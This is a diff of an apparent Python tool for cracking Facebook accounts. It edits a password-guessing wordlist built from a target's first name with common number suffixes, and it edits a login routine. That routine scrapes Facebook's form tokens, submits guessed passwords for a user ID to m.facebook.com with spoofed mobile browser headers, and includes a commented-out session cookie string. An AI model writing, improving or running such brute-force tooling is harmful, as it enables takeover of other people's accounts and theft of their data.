@@ -644,55 +644,28 @@ def passwrd():
                 if len(frs)<3:
                     pass
                 else:
-                    pwv.append(nmf)
-                    pwv.append(frs+'12')
+                    pwv.append(frs+'123'+frs)
                     pwv.append(frs+'123')
-                    pwv.append(frs+'1234')
                     pwv.append(frs+'12345')
                     pwv.append(frs+'123456')
-	            pwv.append(frs+'1234567')
-		    pwv.append(frs+'12345678')
-		    pwv.append(frs+'123456789')
-		    pwv.append(frs+'1234567890')
-                    pwv.append(frs+'1122')
-                    pwv.append(frs+'112233')
-                    pwv.append(frs+frs)
-                    pwv.append(frs+'11')
-                    pwv.append(frs+'0000')
+                    pwv.append(frs+frs+'123')
+                    pwv.append(frs+'1234567890')
+                    pwv.append('12345678'+frs)
+                    pwv.append(frs+'54321')
                     pwv.append(frs+'123@')
-                    pwv.append(frs+'1234@')
-                    pwv.append(frs+'12345@')
-                    pwv.append(frs+'4321@')
-	            pwv.append(frs+'2020')
-		    pwv.append(frs+'2021')
-		    pwv.append(frs+'2022')
-		    pwv.append(frs+'2006')
             else:
                 if len(frs)<3:
                     pwv.append(nmf)
                 else:
-                    pwv.append(frs+'12')
+                    pwv.append(frs+'123'+frs)
                     pwv.append(frs+'123')
-                    pwv.append(frs+'1234')
                     pwv.append(frs+'12345')
                     pwv.append(frs+'123456')
-	            pwv.append(frs+'1234567')
-		    pwv.append(frs+'12345678')
-		    pwv.append(frs+'123456789')
-		    pwv.append(frs+'1234567890')
-                    pwv.append(frs+'1122')
-                    pwv.append(frs+'112233')
-                    pwv.append(frs+frs)
-                    pwv.append(frs+'11')
-                    pwv.append(frs+'0000')
+                    pwv.append(frs+frs+'123')
+                    pwv.append(frs+'1234567890')
+                    pwv.append('12345678'+frs)
+                    pwv.append(frs+'54321')
                     pwv.append(frs+'123@')
-                    pwv.append(frs+'1234@')
-                    pwv.append(frs+'12345@')
-                    pwv.append(frs+'4321@')
-	            pwv.append(frs+'2020')
-		    pwv.append(frs+'2021')
-		    pwv.append(frs+'2022')
-		    pwv.append(frs+'2006')
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
                     pwv.append(xpwd)
@@ -734,13 +707,13 @@ def crack(idf,pwv):
             dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
             koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
             koki+=' m_pixel_ratio=2.625; wd=412x756'
-            heade = {'authority': 'm.facebook.com',
+            heade = {'Host': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
     # 'cookie': 'datr=25a8ZZRH1c5ViiGrbFgYISE3; sb=25a8Ze8reha5oWQ6EfZbFjJw; ps_n=0; ps_l=0; locale=ar_AR; vpd=v1%3B720x393x2.75; zsh=ASR4di5LR5HzrBp-zw3xJzr41bSD4Sc8wEPeIjuE-f8mF7BrEBdsCtN9LdJRkFRcPXpDzjfu9OjiBoGBSQ9dRBcJ4_trEK8vOanhPvOaRNIDh_eZlc3jlUdXhZBCt2W6CXhx0DurR-aB-1ahOKUfoZqWA2HZwPSMzRARk-c33H-JozZcOKWM7BtFPXg06A_8t-J3sHZXK2XxGynpgkAuh6t2wBIWEeVR9fAJwr97F0Pp6_UFVrstsfpkK_asHckhCLW4R0SRA3QOVp2wk1Z-BVomcSCzyfrmTl9k766CLTaa3knBABiaX0dYNR_Yp_fYnXiu; wl_cbv=v2%3Bclient_version%3A2401%3Btimestamp%3A1706870334; m_pixel_ratio=2.75; wd=393x720; fr=06vyUtMmdsqwTeBYB.AWWI_23nirSSxsQN6yplXXchjOU.BlvJbb.Le.AAA.0.0.BlvMZV.AWUm3cXSMMY',
     'dpr': '2.75',
-    'referer': 'https://m.facebook.com/bookmarks/',
+    'referer': 'https://m.facebook.com/',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
     'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
